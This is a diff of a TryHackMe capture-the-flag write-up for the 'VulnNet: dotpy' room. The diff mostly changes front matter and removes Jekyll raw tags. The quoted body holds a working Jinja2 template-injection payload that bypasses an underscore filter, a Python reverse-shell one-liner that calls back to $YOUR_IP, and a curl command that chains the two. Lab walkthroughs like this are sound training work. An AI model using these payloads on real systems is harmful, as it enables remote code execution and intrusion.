@@ -1,8 +1,7 @@
 ---
+title: 'TryHackMe | VulnNet: dotpy'
 date: "2021-04-11T00:00:00Z"
-redirect_from: /writeups/2021/THM/vulnnetDotpy.html
 tags: [tryhackme,web,python,jinja2,pathhijacking]
-title: '[Writeup] TryHackMe | VulnNet: dotpy'
 ---
 
 ## Room Information
@@ -33,19 +32,15 @@ Your request has been blocked.
 I think there are some filters in place, this may make it hard for us.
 First we are gonna try to get a urlparameter
 The following snippet will read the get parameter `c`
-{% raw %}
 ```
 {{request|attr('args')|attr('get')('c')}}?c= 
 ```
-{% endraw %}
 
 now that we can read c. 
 lets try running code on the machine.
-{% raw %}
 ```py
 {{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?us=_&c=
 ```
-{% endraw %}
 
 All of this is to get the `_` from the get parameter `us` and use it in the code, bcause underscores are blocked. 
 this is the code when you dont have the underscore blocker.
@@ -63,11 +58,9 @@ Now that we can run code on the machine lets try running a reverseshell, we are 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$YOUR_IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
-{% raw %}
 ```bash
 curl -c "SESSION=session-cookie" http://$IP:8080/{{request|attr('application')|attr( request|attr('args')|attr('get')('us')*2 + "globals" + request|attr('args')|attr('get')('us')*2 ) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2 )( request|attr('args')|attr('get')('us')*2 + 'builtins' + request|attr('args')|attr('get')('us')*2) |attr( request|attr('args')|attr('get')('us')*2 + 'getitem' + request|attr('args')|attr('get')('us')*2)(request|attr('args')|attr('get')('us')*2 + 'import' + request|attr('args')|attr('get')('us')*2)('os')|attr('popen')(request|attr('args')|attr('get')('c'))|attr('read')()}}?us=_&c=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$YOUR_IP",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
-{% endraw %}
 
 ## Changing user
 Lets do some enumeration, in the following output we see we can run `/usr/bin/pip3 install` as the user `system-adm`
